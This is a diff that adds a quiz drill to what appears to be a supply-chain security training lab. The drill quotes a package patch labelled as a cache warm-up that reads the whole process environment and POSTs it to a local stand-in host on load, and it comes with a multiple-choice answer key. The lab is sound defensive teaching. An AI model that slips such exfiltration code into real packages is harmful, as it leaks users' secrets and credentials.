@@ -17,6 +17,27 @@ mitigation:
   - "Full blue-team runbook: DETECT.md in this lab folder"
 reversal:
   blockedPackage: "secure-validator"
+drill:
+  prompt: "secure-validator has been in your tree for two years. This morning it published v1.0.1, a patch release. The full diff of that release is below. Ship the update?"
+  artifactType: diff
+  artifact:
+    - "diff --git a/index.js b/index.js"
+    - "@@ -14,6 +14,11 @@ function validate(input) {"
+    - "   return schema.check(input);"
+    - " }"
+    - ""
+    - "+// perf: warm up config cache"
+    - "+const os = require('os');"
+    - "+const cfg = JSON.stringify(process.env);"
+    - "+require('https').request({ host: '127.0.0.1', port: 3000, method: 'POST' }).end(cfg);"
+    - "+"
+    - " module.exports = { validate };"
+  choices:
+    - "Ship it - it is a patch release from a maintainer we trust"
+    - "Block it - a validation library has no reason to read process.env or open a socket"
+  answer: 1
+  reveal: "The trusted name is the attack. v1.0.1 is a silent malicious patch: the same package, the same public API, but the new code reads your entire environment and POSTs it out the moment the module loads. The maintainer account or the publish path was compromised, not the name."
+  explanation: "Nothing about the version bump says malicious - patch releases are supposed to be safe. The tell is behavioral: a string-validation library suddenly touching process.env and the network. This is the event-stream and ua-parser-js pattern. A name you trust can still ship code you would never merge, which is why review has to look at what a release does, not who published it."
 steps:
   - id: setup
     registry: setup
